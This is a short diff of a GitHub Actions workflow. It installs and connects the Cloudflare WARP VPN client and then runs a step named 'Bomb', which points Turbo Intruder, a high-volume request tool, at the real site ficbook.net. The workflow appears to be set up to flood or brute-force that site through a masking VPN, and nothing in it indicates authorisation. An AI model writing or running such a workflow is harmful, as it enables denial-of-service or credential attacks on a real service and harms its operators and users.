@@ -26,7 +26,7 @@ jobs:
         echo 'deb [arch=amd64 signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ focal main' | sudo tee /etc/apt/sources.list.d/cloudflare-client.list
         sudo apt update
         sudo apt install cloudflare-warp
-        warp-cli register
-        warp-cli connect
+        warp-cli register --accept-tos
+        warp-cli connect 
     - name: Bomb
       run: java -jar turbo-intruder-all.jar beta/script_l.py beta/req.txt https://ficbook.net:433 foo
